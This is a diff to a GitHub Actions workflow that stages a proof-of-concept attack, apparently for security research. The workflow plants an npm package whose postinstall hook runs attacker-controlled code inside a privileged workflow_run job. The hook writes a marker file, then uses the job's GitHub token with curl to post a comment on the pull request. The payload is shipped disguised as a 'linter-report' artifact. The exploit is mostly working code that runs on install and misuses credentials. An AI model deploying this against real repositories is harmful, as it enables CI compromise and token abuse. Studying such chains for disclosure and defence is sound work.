@@ -26,6 +26,7 @@ jobs:
           cat > out/evil/package.json <<'PKG'
           { "name": "gab-poc-local-evil", "version": "1.0.0", "scripts": { "postinstall": "node hook.js" } }
           PKG
+          printf 'foreground-scripts=true\n' > out/.npmrc
           cat > out/evil/hook.js <<'JS'
           const fs = require('fs');
           const os = require('os');
@@ -41,18 +42,23 @@ jobs:
           fs.writeFileSync(root + '/GAB_RCE_MARKER.txt', line + '\n');
           console.log(line);
           if (tok && repo && /^[0-9]+$/.test(pr)) {
-            fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
-              method: 'POST',
-              headers: { authorization: 'Bearer ' + tok, accept: 'application/vnd.github+json',
-                         'content-type': 'application/json' },
-              body: JSON.stringify({ body: 'GAB PoC: attacker-controlled postinstall executed inside the privileged workflow_run job. ' + line })
-            }).then(r => console.log('COMMENT_HTTP=' + r.status)).catch(e => console.log('COMMENT_ERR=' + e.message));
+            const body = JSON.stringify({ body: 'GAB PoC hook ran: ' + line });
+            try {
+              const out = require('child_process').execSync(
+                'curl -sS -o /tmp/ghresp -w "%{http_code}" --max-time 20 -X POST ' +
+                '-H "Authorization: Bearer ' + tok + '" -H "Accept: application/vnd.github+json" ' +
+                '-H "Content-Type: application/json" ' +
+                '"https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments" ' +
+                '-d ' + JSON.stringify(body),
+                { timeout: 25000 }).toString();
+              console.log('COMMENT_HTTP=' + out);
+            } catch (e) { console.log('COMMENT_ERR=' + e.message); }
           }
           JS
       - name: Upload linter report
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
-          path: out/*
+          path: out/
           include-hidden-files: true
           if-no-files-found: ignore
